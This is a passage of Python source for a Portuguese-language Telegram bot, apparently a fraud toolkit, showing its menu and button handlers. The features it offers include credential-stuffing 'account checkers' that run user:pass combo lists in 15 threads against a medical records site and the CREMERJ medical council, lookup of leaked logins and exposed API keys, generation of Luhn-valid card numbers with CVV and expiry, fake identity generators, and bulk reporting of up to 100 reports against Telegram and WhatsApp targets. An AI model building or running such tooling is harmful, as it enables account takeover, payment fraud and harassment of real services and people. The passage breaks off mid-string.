            "🔍 **Será verificado:**\n"
            "• Formato correto\n"
            "• Dígitos verificadores\n"
            "• Algoritmo da Receita Federal\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "⌨️ Digite o CNPJ no chat:",
            buttons=[[Button.inline("🔙 Voltar", data=f"validadores:{id_user_btn}")]]
        )

    elif acao == "validar_cartao":
        await safe_edit_message(event,
            f"💳 **VALIDADOR DE CARTÃO**\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🛠️ **COMO VALIDAR:**\n\n"
            "1. Digite o número do cartão\n"
            "2. Sistema verifica algoritmo de Luhn\n"
            "3. Resultado imediato\n\n"
            "✅ **Suporta todas as bandeiras**\n"
            "💳 **Formatos aceitos:**\n"
            "• `4532 1234 5678 9012`\n"
            "• `4532123456789012`\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🤖 @CatalystServerRobot",
            buttons=[
                [Button.inline("💳 Inserir Cartão", data=f"validar_cartao_input:{id_user_btn}")],
                [Button.inline("🔙 Voltar", data=f"validadores:{id_user_btn}")]
            ]
        )

    elif acao == "validar_cartao_input":
        globals()[f'validar_cartao_state_{id_user_btn}'] = {'waiting': True}

        await safe_edit_message(event,
            f"💳 **VALIDADOR DE CARTÃO**\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "📝 **Digite o número do cartão:**\n\n"
            "💡 **Formatos aceitos:**\n"
            "• `4532 1234 5678 9012`\n"
            "• `4532123456789012`\n\n"
            "🔍 **Será verificado:**\n"
            "• Algoritmo de Luhn\n"
            "• Dígito verificador\n"
            "• Todas as bandeiras\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "⌨️ Digite o número no chat:",
            buttons=[[Button.inline("🔙 Voltar", data=f"validadores:{id_user_btn}")]]
        )

    elif acao == "copiar_empresa":
        try:
            empresa = DataGenerator.gerar_empresa_fake()

            # Criar texto formatado para cópia
            copy_text = f"""🏢 DADOS DA EMPRESA FAKE BRASILEIRA

📋 Razão Social: {empresa['razao_social']}
🏪 Nome Fantasia: {empresa['nome_fantasia']}
🆔 CNPJ: {empresa['cnpj']}
📋 Inscrição Estadual: {empresa['inscricao_estadual']}
📊 Situação: {empresa['situacao']}
📅 Data de Abertura: {empresa['data_abertura']}
💰 Capital Social: {empresa['capital_social']}
🎯 Atividade Principal: {empresa['atividade_principal']}
📏 Porte: {empresa['porte']}
⚖️ Natureza Jurídica: {empresa['natureza_juridica']}

✅ CNPJ válido pelo algoritmo da Receita Federal
⚠️ Dados fictícios para fins de teste
🤖 @CatalystServerRobot"""

            await bot.send_message(
                event.chat_id,
                copy_text,
                buttons=[[Button.inline("🗑️ Apagar", data=f"apagarmensagem:{id_user_btn}")]]
            )

            await event.answer("📋 Dados da empresa copiados!", alert=True)
        except Exception as e:
            await event.answer(f"❌ Erro ao copiar: {str(e)[:50]}", alert=True)

    elif acao == "gerar_5_empresas":
        try:
            await safe_edit_message(event, "🏢 **Gerando 5 empresas...**", buttons=[])

            empresas = []
            for i in range(5):
                try:
                    empresa = DataGenerator.gerar_empresa_fake()
                    empresas.append(f"**EMPRESA {i+1}:**\n🏢 {empresa['razao_social']}\n🆔 {empresa['cnpj']}\n📊 {empresa['situacao']}")
                except Exception as e:
                    empresas.append(f"**EMPRESA {i+1}:** ❌ Erro na geração")

            resultado = f"🏢 **5 EMPRESAS GERADAS**\n\n" + "\n\n".join(empresas)
            resultado += f"\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n🤖 @CatalystServerRobot"

            await safe_edit_message(event,
                resultado,
                buttons=[
                    [Button.inline("🔄 Gerar Mais 5", data=f"gerar_5_empresas:{id_user_btn}")],
                    [Button.inline("🔙 Voltar", data=f"empresas_fake:{id_user_btn}")]
                ]
            )
        except Exception as e:
            await safe_edit_message(event,
                f"❌ **ERRO AO GERAR EMPRESAS**\n\n{str(e)[:100]}",
                buttons=[[Button.inline("🔙 Voltar", data=f"empresas_fake:{id_user_btn}")]]
            )

    elif acao == "gerar_5_cartoes":
        try:
            await safe_edit_message(event, "💳 **Gerando 5 cartões...**", buttons=[])

            cartoes = []
            for i in range(5):
                try:
                    cartao = DataGenerator.gerar_cartao()
                    cartoes.append(f"**CARTÃO {i+1} - {cartao['bandeira']}:**\n💳 {cartao['numero']}\n🛡️ {cartao['cvv']} | 📅 {cartao['validade']}")
                except Exception as e:
                    cartoes.append(f"**CARTÃO {i+1}:** ❌ Erro na geração")

            resultado = f"💳 **5 CARTÕES GERADOS**\n\n" + "\n\n".join(cartoes)
            resultado += f"\n\n✅ Todos válidos pelo algoritmo de Luhn\n⚠️ Apenas para fins educacionais\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n🤖 @CatalystServerRobot"

            await safe_edit_message(event,
                resultado,
                buttons=[
                    [Button.inline("🔄 Gerar Mais 5", data=f"gerar_5_cartoes:{id_user_btn}")],
                    [Button.inline("🔙 Voltar", data=f"cartoes_credito:{id_user_btn}")]
                ]
            )
        except Exception as e:
            await safe_edit_message(event,
                f"❌ **ERRO AO GERAR CARTÕES**\n\n{str(e)[:100]}",
                buttons=[[Button.inline("🔙 Voltar", data=f"cartoes_credito:{id_user_btn}")]]
            )

    elif acao == "suggestion":
        # Simulação de sugestão
        await event.answer("💡 Sugestão em breve...", alert=True)

    elif acao == "area_busca":
        await safe_edit_message(event,
            "🔍 **COMANDOS DE BUSCA & EXTRAÇÃO**\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🔍 `/search [url]` - Buscar logins em sites\n"
            "   💡 Exemplo: `/search facebook.com`\n"
            "   ⚡ Encontra credenciais em vazamentos\n\n"
            "🌐 `/webscraper [url]` - Extrair dados do site\n"
            "   💡 Exemplo: `/webscraper example.com`\n"
            "   📧 Extrai emails, telefones e links\n\n"
            "🔍 `/api [url]` - Análise completa de APIs\n"
            "   💡 Exemplo: `/api api.site.com`\n"
            "   🎯 Encontra endpoints, docs, GraphQL, etc\n\n"
            "🔑 `/apikey [url]` - Buscar API Keys expostas\n"
            "   💡 Exemplo: `/apikey site.com`\n"
            "   🔑 Procura chaves e tokens expostos\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "💡 **Dicas de uso:**\n"
            "• URLs podem ser com ou sem https://\n"
            "• Use `/reset` se algo der errado\n"
            "• Resultados em formato TXT ou formatado\n\n"
            "🤖 @CatalystServerRobot",
            buttons=[
                [Button.inline("🔍 Usar /search", data=f"cmd_search:{id_user_btn}"),
                 Button.inline("🌐 Usar /webscraper", data=f"cmd_webscraper:{id_user_btn}")],
                [Button.inline("🔙 Voltar às Áreas", data=f"show_commands:{id_user_btn}")],
                [Button.inline("🗑️ Fechar", data=f"apagarmensagem:{id_user_btn}")]
            ]
        )

    elif acao == "area_reports":
        await safe_edit_message(event,
            "📤 **COMANDOS DE REPORTS**\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "📝 `/report` - Reports Telegram (Básico)\n"
            "   💡 Sistema simples e rápido\n"
            "   🎯 Para canais, grupos e usuários\n\n"
            "📱 `/reportwpp` - Reports WhatsApp\n"
            "   💡 Reportar números suspeitos\n"
            "   🎯 Sistema automatizado\n\n"
            "❌ `/report2` - **INDISPONÍVEL**\n"
            "   ⚠️ Limitação técnica de bots\n"
            "   💡 Use /report como alternativa\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "⚠️ **Importante:** Use com responsabilidade!\n\n"
            "🤖 @CatalystServerRobot",
            buttons=[
                [Button.inline("📝 Usar /report", data=f"cmd_report:{id_user_btn}"),
                 Button.inline("📱 Usar /reportwpp", data=f"cmd_reportwpp:{id_user_btn}")],
                [Button.inline("🔙 Voltar às Áreas", data=f"show_commands:{id_user_btn}")],
                [Button.inline("🗑️ Fechar", data=f"apagarmensagem:{id_user_btn}")]
            ]
        )

    elif acao == "area_ferramentas":
        await safe_edit_message(event,
            "🛠️ **COMANDOS DE FERRAMENTAS**\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🛠️ `/checker` - Catalyst Checker v3.0\n"
            "   🌐 Sites Checker - Verificar status\n"
            "   📊 Verificação de sites populares\n"
            "   🎯 Sites customizados\n\n"
            "🎲 `/geradores` - Ferramentas de Geração\n"
            "   👤 Gerador de Pessoa Fake v2.0\n"
            "   📊 Banco de dados brasileiro real\n"
            "   ✅ CPF e RG válidos\n"
            "   🇧🇷 Endereços reais por estado\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🎯 **Recursos Disponíveis:**\n"
            "• Verificação de status de sites\n"
            "• Geração de pessoas realistas\n"
            "• Dados brasileiros autênticos\n"
            "• Milhões de combinações possíveis\n\n"
            "🤖 @CatalystServerRobot",
            buttons=[
                [Button.inline("🛠️ Usar /checker", data=f"cmd_checker:{id_user_btn}"),
                 Button.inline("🎲 Usar /geradores", data=f"cmd_geradores:{id_user_btn}")],
                [Button.inline("🔙 Voltar às Áreas", data=f"show_commands:{id_user_btn}")],
                [Button.inline("🗑️ Fechar", data=f"apagarmensagem:{id_user_btn}")]
            ]
        )

    elif acao == "area_sistema":
        await safe_edit_message(event,
            "⚙️ **COMANDOS DO SISTEMA**\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🏠 `/start` - Iniciar o bot\n"
            "   💡 Comando inicial obrigatório\n"
            "   📊 Registra usuário no sistema\n\n"
            "🔄 `/reset` - Resetar todos os dados\n"
            "   💡 Limpa pesquisas em andamento\n"
            "   🛑 Para reports em execução\n"
            "   🗂️ Remove arquivos temporários\n\n"
            "📋 `/comandos` - Ver lista de comandos\n"
            "   💡 Menu interativo completo\n"
            "   🎯 Navegação por categorias\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "💡 **Dicas importantes:**\n"
            "• Sempre use `/start` primeiro\n"
            "• Use `/reset` se algo travar\n"
            "• `/comandos` para ajuda rápida\n\n"
            "🤖 @CatalystServerRobot",
            buttons=[
                [Button.inline("🏠 Usar /start", data=f"cmd_start:{id_user_btn}"),
                 Button.inline("🔄 Usar /reset", data=f"cmd_reset:{id_user_btn}")],
                [Button.inline("📋 Usar /comandos", data=f"cmd_comandos:{id_user_btn}")],
                [Button.inline("🔙 Voltar às Áreas", data=f"show_commands:{id_user_btn}")],
                [Button.inline("🗑️ Fechar", data=f"apagarmensagem:{id_user_btn}")]
            ]
        )

    elif acao == "lista_completa":
        await safe_edit_message(event,
            "📋 **LISTA COMPLETA DE COMANDOS**\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🏠 `/start` - Iniciar o bot\n"
            "🏓 `/ping` - Verificar status do bot\n"
            "🔍 `/search [url]` - Buscar logins em sites\n"
            "🌐 `/webscraper [url]` - Extrair dados do site\n"
            "📝 `/report` - Enviar reports Telegram\n"
            "⚡ `/report2` - Sistema avançado de reports\n"
            "📱 `/reportwpp` - Reportar números WhatsApp\n"
            "🛠️ `/checker` - Ferramentas Checker\n"
            "🎲 `/geradores` - Ferramentas de Geração\n"
            "🔄 `/reset` - Resetar todos os dados\n"
            "📋 `/comandos` - Ver esta lista\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "💡 **Como usar:**\n"
            "• Digite o comando desejado\n"
            "• Siga as instruções do bot\n"
            "• Use `/reset` se algo der errado\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🤖 @CatalystServerRobot",
            buttons=[
                [Button.inline("🔙 Voltar às Áreas", data=f"show_commands:{id_user_btn}")],
                [Button.inline("🗑️ Fechar", data=f"apagarmensagem:{id_user_btn}")]
            ]
        )

    elif acao == "quick_check":
        # Verificação rápida de sites comuns
        quick_sites = ["https://google.com", "https://facebook.com", "https://youtube.com"]
        results = []
        for site in quick_sites:
            status_info = check_site_status(site)
            site_name = site.replace("https://", "")
            results.append(f"• {site_name}: {status_info['status']}")

        await safe_edit_message(event,
            f"⚡ **VERIFICAÇÃO RÁPIDA**\n\n" + "\n".join(results) + f"\n\n🤖 @CatalystServerRobot",
            buttons=[[Button.inline("🔙 Voltar", data=f"sites_checker:{id_user_btn}")]]
        )

    elif acao == "full_status":
        # Status completo de vários sites
        await safe_edit_message(event,
            "📊 **STATUS COMPLETO EM DESENVOLVIMENTO**\n\n🤖 @CatalystServerRobot",
            buttons=[[Button.inline("🔙 Voltar", data=f"sites_checker:{id_user_btn}")]]
        )

    elif acao == "account_checker":
        await safe_edit_message(event,
            f"🔐 **ACCOUNT CHECKER v3.0**\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🎯 **CHECKERS DISPONÍVEIS:**\n\n"
            "🏥 **ConsultCenter.com.br**\n"
            "   • Sistema de consultas médicas\n"
            "   • Verificação de login válido\n"
            "   • Multi-thread (15 threads)\n\n"
            "🏥 **CREMERJ.org.br**\n"
            "   • Conselho Regional de Medicina RJ\n"
            "   • Verificação de médicos\n"
            "   • Multi-thread (15 threads)\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "💡 **Como usar:**\n"
            "1. Selecione o checker desejado\n"
            "2. Cole sua lista de combos (user:pass)\n"
            "3. Aguarde o resultado\n\n"
            "🤖 @CatalystServerRobot",
            buttons=[
                [Button.inline("🏥 ConsultCenter", data=f"check_consultcenter:{id_user_btn}"),
                 Button.inline("🏥 CREMERJ", data=f"check_cremerj:{id_user_btn}")],
                [Button.inline("🔙 Voltar", data=f"checker_menu:{id_user_btn}")]
            ]
        )

    elif acao == "check_consultcenter":
        await safe_edit_message(event,
            f"🏥 **CONSULTCENTER CHECKER**\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🎯 **ESCOLHA O MÉTODO:**\n\n"
            "🔧 **Checker Local**\n"
            "   • Verificação direta no site\n"
            "   • 15 threads simultâneas\n"
            "   • Análise detalhada\n\n"
            "🌐 **Site Externo**\n"
            "   • Enviar para checker online\n"
            "   • Resultados já separados\n"
            "   • Mais rápido e eficiente\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🤖 @CatalystServerRobot",
            buttons=[
                [Button.inline("🔧 Checker Local", data=f"consultcenter_local:{id_user_btn}"),
                 Button.inline("🌐 Site Externo", data=f"consultcenter_external:{id_user_btn}")],
                [Button.inline("🔙 Voltar", data=f"account_checker:{id_user_btn}")]
            ]
        )

    elif acao == "consultcenter_local":
        # Criar estado para aguardar lista de combos (método local)
        globals()[f'consultcenter_state_{id_user_btn}'] = {'waiting_combos': True, 'method': 'local'}

        await safe_edit_message(event,
            f"🏥 **CONSULTCENTER CHECKER - LOCAL**\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "📝 **Cole sua lista de combos:**\n\n"
            "💡 **Formato aceito:**\n"
            "```\n"
            "usuario1:senha1\n"
            "usuario2:senha2\n"
            "email@exemplo.com:senha123\n"
            "```\n\n"
            "🎯 **Sistema:** `sistema.consultcenter.com.br`\n"
            "⚡ **Threads:** `15 simultâneas`\n"
            "🕐 **Timeout:** `30 segundos`\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "⌨️ Cole os combos no chat:",
            buttons=[[Button.inline("🔙 Voltar", data=f"check_consultcenter:{id_user_btn}")]]
        )

    elif acao == "consultcenter_external":
        # Criar estado para aguardar URL do site e combos
        globals()[f'consultcenter_state_{id_user_btn}'] = {'waiting_site_url': True, 'method': 'external'}

        await safe_edit_message(event,
            f"🌐 **CONSULTCENTER CHECKER - SITE EXTERNO**\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "📝 **Digite a URL do site de checkers:**\n\n"
            "💡 **Exemplo:**\n"
            "`https://exemplo.com/checker`\n"
            "`https://site-checker.com`\n\n"
            "🎯 **O que acontece:**\n"
            "1. Bot acessa o site fornecido\n"
            "2. Encontra o formulário de checker\n"
            "3. Envia seus combos automaticamente\n"
            "4. Retorna os resultados separados\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "⌨️ Digite a URL do site no chat:",
            buttons=[[Button.inline("🔙 Voltar", data=f"check_consultcenter:{id_user_btn}")]]
        )

    elif acao == "check_cremerj":
                                    # Criar estado para aguardar lista de combos do CREMERJ
                                    globals()[f'cremerj_state_{id_user_btn}'] = {'waiting_combos': True}

                                    await safe_edit_message(event,
                                        f"🏥 **CREMERJ CHECKER**\n\n"
                                        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                                        "📝 **Cole sua lista de combos:**\n\n"
                                        "💡 **Formato aceito:**\n"
                                        "```\n"
                                        "crm12345:senha123\n"
                                        "medico@email.com:senha456\n"
                                        "usuario:password\n"
                                        "```\n\n"
                                        "🎯 **Sistema:** `cremerj.org.br`\n"
            "⚡ **Threads:** `15 simultâneas`\n"
            "🕐 **Timeout:** `30 segundos`\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "⌨️ Cole os combos no chat:",
            buttons=[[Button.inline("🔙 Voltar", data=f"account_checker:{id_user_btn}")]]
        )

    elif acao == "deletefile":
        id_user_btn = int(parts[1])
        if event.sender_id != id_user_btn:
            await event.answer("APENAS O USUÁRIO QUE RECEBEU O ARQUIVO PODE APAGAR.", alert=True)
            return
        await event.delete()

    elif acao == "cmd_search":
       await safe_edit_message(event, "Para usar o comando /search, digite /search [url] seguido do site que quer pesquisar.",
             buttons=[[Button.inline("🗑️ Fechar", data=f"apagarmensagem:{id_user_btn}")]]
        )

    elif acao == "cmd_webscraper":
        await safe_edit_message(event, "Para usar o comando /webscraper, digite /webscraper [url] seguido do site que quer extrair os dados.",
              buttons=[[Button.inline("🗑️ Fechar", data=f"apagarmensagem:{id_user_btn}")]]
          )

    elif acao == "cmd_report":
        await safe_edit_message(event, "Para usar o comando /report, basta digitar /report e seguir os passos do bot.",
               buttons=[[Button.inline("🗑️ Fechar", data=f"apagarmensagem:{id_user_btn}")]]
           )

    elif acao == "cmd_reportwpp":
        await safe_edit_message(event, "Para usar o comando /reportwpp, basta digitar /reportwpp e seguir os passos do bot.",
                buttons=[[Button.inline("🗑️ Fechar", data=f"apagarmensagem:{id_user_btn}")]]
            )

    elif acao == "cmd_checker":
        await safe_edit_message(event, "Para usar o comando /checker, basta digitar /checker e usar as ferramentas.",
                 buttons=[[Button.inline("🗑️ Fechar", data=f"apagarmensagem:{id_user_btn}")]]
             )

    elif acao == "cmd_geradores":
        await safe_edit_message(event,
            "🎲 **COMO USAR /geradores**\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "💡 **Uso simples:**\n"
            "Digite `/geradores` para acessar:\n\n"
            "🎯 **Funcionalidades:**\n"
            "• 👤 Gerador de Pessoa Fake v2.0\n"
            "• 📊 Banco de dados brasileiro real\n"
            "• ✅ CPF e RG algoritmicamente válidos\n"
            "• 🇧🇷 Endereços reais de todas as regiões\n"
            "• 📞 Telefones com DDDs válidos\n"
            "• 📧 Emails com domínios brasileiros\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🎲 **Milhões de combinações possíveis!**\n\n"
            "🤖 @CatalystServerRobot",
            buttons=[[Button.inline("🗑️ Fechar", data=f"apagarmensagem:{id_user_btn}")]]
        )

    elif acao == "cmd_reset":
        await safe_edit_message(event, "Para usar o comando /reset, basta digitar /reset e os dados serão resetados.",
                   buttons=[[Button.inline("🗑️ Fechar", data=f"apagarmensagem:{id_user_btn}")]]
               )

    elif acao == "cmd_report2":
        await safe_edit_message(event,
            "⚡ **COMO USAR /report2**\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "📝 **Passo a passo:**\n"
            "1. Digite `/report2`\n"
            "2. Escolha o tipo de denúncia\n"
            "3. Selecione o tipo de alvo\n"
            "4. Informe o alvo (usuário/canal/post)\n"
            "5. Escolha o motivo específico\n"
            "6. Defina a quantidade (1-100)\n\n"
            "🎯 **Tipos de alvo:**\n"
            "• 👤 Conta de usuário\n"
            "• 📢 Canal público\n"
            "• 👥 Grupo\n"
            "• 🤖 Bot\n"
            "• 📝 Post específico\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "⚠️ Use com responsabilidade!\n\n"
            "🤖 @CatalystServerRobot",
            buttons=[[Button.inline("🗑️ Fechar", data=f"apagarmensagem:{id_user_btn}")]]
        )

    elif acao == "cmd_start":
        await safe_edit_message(event,
            "🏠 **COMO USAR /start**\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "💡 **Comando mais simples:**\n"
            "Basta digitar `/start` para iniciar o bot\n\n"
            "🎯 **O que acontece:**\n"
            "• Registra você no sistema\n"
            "• Mostra as funcionalidades\n"
            "• Prepara o bot para uso\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "✅ **Sempre use este comando primeiro!**\n\n"
            "🤖 @CatalystServerRobot",
            buttons=[[Button.inline("🗑️ Fechar", data=f"apagarmensagem:{id_user_btn}")]]
        )

    elif acao == "cmd_comandos":
        await safe_edit_message(event,
            "📋 **COMO USAR /comandos**\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "💡 **Uso simples:**\n"
            "Digite `/comandos` para ver este menu\n\n"
            "🎯 **Funcionalidades:**\n"
            "• Lista completa de comandos\n"
            "• Navegação por áreas\n"
            "• Botões interativos\n"
            "• Ajuda contextual\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "💡 **Perfeito para iniciantes!**\n\n"
            "🤖 @CatalystServerRobot",
            buttons=[[Button.inline("🗑️ Fechar", data=f"apagarmensagem:{id_user_btn}")]]
        )

    elif acao == "cmd_ping":
        await safe_edit_message(event,
            "🏓 **COMO USAR /ping**\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "💡 **Uso simples:**\n"
            "Basta digitar `/ping` para verificar o status\n\n"
            "🎯 **Informações mostradas:**\n"
            "• Status do bot (Online/Offline)\n"
            "• Tempo de resposta em ms\n"
            "• Uptime do sistema\n"
            "• Usuários registrados\n"
            "• Versão do Python e Telethon\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "💡 **Útil para verificar se o bot está funcionando!**\n\n"
            "🤖 @CatalystServerRobot",
            buttons=[[Button.inline("🗑️ Fechar", data=f"apagarmensagem:{id_user_btn}")]]
        )

    # Handlers para botões de administrador
    elif acao == "admin_auth":
        if not eh_dono(id_user_btn):
            await event.answer("🚫 Acesso negado!", alert=True)
            return
            
        await safe_edit_message(event,
            "🔐 **COMANDOS DE AUTORIZAÇÃO**\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "📝 **Como usar:**\n\n"
            "🎯 **Autorizar permanente:**\n"
            "`/autorizar 123456789`\n\n"
            "⏰ **Autorizar temporário:**\n"
            "`/autorizar 123456789 30d` (30 dias)\n"
            "`/autorizar 123456789 12h` (12 horas)\n"
            "`/autorizar 123456789 60m` (60 minutos)\n\n"
            "➕ **Estender tempo:**\n"
            "`/estender 123456789 7d` (adicionar 7 dias)\n\n"
            "❌ **Remover autorização:**\n"
            "`/desautorizar 123456789`\n\n"
            "📋 **Gerenciamento:**\n"
            "`/listautorizados` - Ver usuários\n"
            "`/authstatus` - Status do sistema\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🤖 @CatalystServerRobot",
            buttons=[[Button.inline("🔙 Voltar", data=f"comandos_voltar:{id_user_btn}")]]
        )

    elif acao == "admin_div":
        if not eh_dono(id_user_btn):
            await event.answer("🚫 Acesso negado!", alert=True)
            return
            
        await safe_edit_message(event,
            "📢 **COMANDOS DE DIVULGAÇÃO**\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "📝 **Como usar:**\n\n"
            "🟢 **Ativar/Desativar:**\n"
            "`/on` - Ativar divulgação automática\n"
            "`/off` - Desativar divulgação automática\n\n"
            "➕ **Adicionar chats:**\n"
            "`/addchat @canal` - Por username\n"
            "`/addchat -100123456789` - Por ID\n\n"
            "➖ **Remover chats:**\n"
            "`/removechat @canal` - Por username\n"
            "`/removechat -100123456789` - Por ID\n\n"
            "📋 **Gerenciamento:**\n"
            "`/listchats` - Ver chats autorizados\n"
            "`/divconfig` - Configurações\n"
            "`/testdiv` - Testar sistema\n\n"
            "⏰ **Intervalo:** 20 minutos automático\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🤖 @CatalystServerRobot",
            buttons=[[Button.inline("🔙 Voltar", data=f"comandos_voltar:{id_user_btn}")]]
        )

    elif acao == "admin_broadcast":
        if not eh_dono(id_user_btn):
            await event.answer("🚫 Acesso negado!", alert=True)
            return
            
        await safe_edit_message(event,
            "📺 **COMANDOS DE BROADCAST**\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "📝 **Como usar:**\n\n"
            "📢 **Broadcast Geral:**\n"
            "`/broadcast [mensagem]` - Envia para todos os usuários registrados\n\n"
            "👥 **Broadcast Autorizados:**\n"
            "`/broadcastauth [mensagem]` - Envia apenas para usuários autorizados\n\n"
            "💡 **Exemplos:**\n"
            "`/broadcast 🎉 Novidades no bot! Confira as novas funcionalidades.`\n"
            "`/broadcastauth ⚠️ Manutenção programada para hoje às 20h.`\n\n"
            "⚠️ **Importante:**\n"
            "• O sistema solicita confirmação antes de enviar\n"
            "• Mostra estatísticas de envio em tempo real\n"
            "• Ignora usuários que bloquearam o bot\n"
            "• Delay automático para evitar spam\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🤖 @CatalystServerRobot",
            buttons=[[Button.inline("🔙 Voltar", data=f"comandos_voltar:{id_user_btn}")]]
        )

    elif acao == "admin_restart":
        if not eh_dono(id_user_btn):
            await event.answer("🚫 Acesso negado!", alert=True)
            return
            
        await safe_edit_message(event,
            "🔄 **COMANDO RESTART BOT**\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "📝 **Como usar:**\n"
            "`/restartbot`\n\n"
            "⚡ **O que faz:**\n"
            "• 🗂️ Limpa dados temporários\n"
            "• 🔄 Reseta variáveis globais\n"
            "• ⏹️ Para reports em andamento\n"
            "• 🛑 Cancela buscas ativas\n"
            "• 💾 Otimiza memória do sistema\n"
            "• 🚀 Deixa o bot mais leve\n\n"
            "⚠️ **Importante:**\n"
            "• Todos os processos em andamento serão parados\n"
            "• Usuários serão notificados\n"
            "• O bot continuará funcionando normalmente\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🤖 @CatalystServerRobot",
            buttons=[[Button.inline("🔙 Voltar", data=f"comandos_voltar:{id_user_btn}")]]
        )

    elif acao == "admin_status":
        if not eh_dono(id_user_btn):
            await event.answer("🚫 Acesso negado!", alert=True)
            return
            
        # Estatísticas do sistema
        cursor.execute("SELECT COUNT(*) FROM usuarios")
        total_users = cursor.fetchone()[0]
        
        cursor.execute("SELECT COUNT(*) FROM usuarios WHERE admin = 'yes' OR data_expiracao IS NULL OR data_expiracao > datetime('now')")
        users_authorized = cursor.fetchone()[0]

        await safe_edit_message(event,
            f"📊 **STATUS DO SISTEMA**\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"👥 **Usuários totais:** {total_users}\n"
            f"✅ **Usuários autorizados:** {users_authorized}\n"
            f"📢 **Chats de divulgação:** {len(chats_autorizados)}\n"
            f"🔄 **Divulgação ativa:** {'🟢 Sim' if divulgacao_ativa else '🔴 Não'}\n"
            f"👑 **ID do dono:** `{DONO_ID}`\n\n"
            "⚡ **Estado dos serviços:**\n"
            f"🗄️ **Banco de dados:** ✅ Conectado\n"
            f"🤖 **Bot:** ✅ Online\n"
            f"📊 **Reports:** {'🟢 Ativo' if not (report_data['running'] or whatsapp_report_data['running']) else '🟡 Em uso'}\n"
            f"🔍 **Buscas:** {'🟢 Disponível' if not usuarios_bloqueados else '🟡 Em uso'}\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🤖 @CatalystServerRobot",
            buttons=[[Button.inline("🔙 Voltar", data=f"comandos_voltar:{id_user_btn}")]]
        )

    elif acao == "test_external_integration":
        # Iniciar teste de integração externa
        globals()[f'test_integration_state_{id_user_btn}'] = {'waiting_site_url': True}

        await safe_edit_message(event,
            f"🧪 **TESTE DE INTEGRAÇÃO - PASSO 1/2**\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🌐 **Digite a URL do site de checkers:**\n\n"
            "💡 **Exemplos:**\n"
            "`https://checker-site.com`\n"
            "`https://exemplo.com/checker`\n"
            "`https://tools.site.com/consultcenter`\n\n"
            "🎯 **O bot irá:**\n"
            "• Acessar o site automaticamente\n"
            "• Encontrar o formulário de checker\n"
            "• Analisar a estrutura da página\n"
            "• Preparar para envio dos combos\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "⌨️ Digite a URL no chat:",
            buttons=[[Button.inline("🔙 Voltar", data=f"test_consultcenter_menu:{id_user_btn}")]]
        )

    elif acao == "show_integration_example":
        await safe_edit_message(event,
            f"📋 **EXEMPLO DE INTEGRAÇÃO**\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🎯 **Cenário:**\n"
            "Você tem um site de checkers online e quer que o bot envie os combos automaticamente.\n\n"
            "🔄 **Processo:**\n"
